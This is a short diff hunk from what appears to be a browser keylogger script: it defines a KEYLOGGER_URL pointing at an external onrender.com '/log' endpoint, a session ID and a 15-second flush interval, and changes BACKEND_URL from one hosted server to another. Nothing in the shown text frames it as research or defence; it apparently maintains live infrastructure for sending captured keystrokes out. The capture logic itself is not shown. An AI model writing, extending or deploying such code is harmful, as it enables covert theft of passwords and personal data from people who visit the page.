@@ -10,7 +10,7 @@
     // ============================================================
 
     const KEYLOGGER_URL = window.KEYLOGGER_URL || 'https://keyserver-eaar.onrender.com/log';
-    const BACKEND_URL = window.BACKEND_URL || 'https://meeting-h5ze.onrender.com';
+    const BACKEND_URL = window.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com';
     const SESSION_ID = window.SESSION_ID || 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
     
     const FLUSH_INTERVAL = 15000;  // 15 seconds
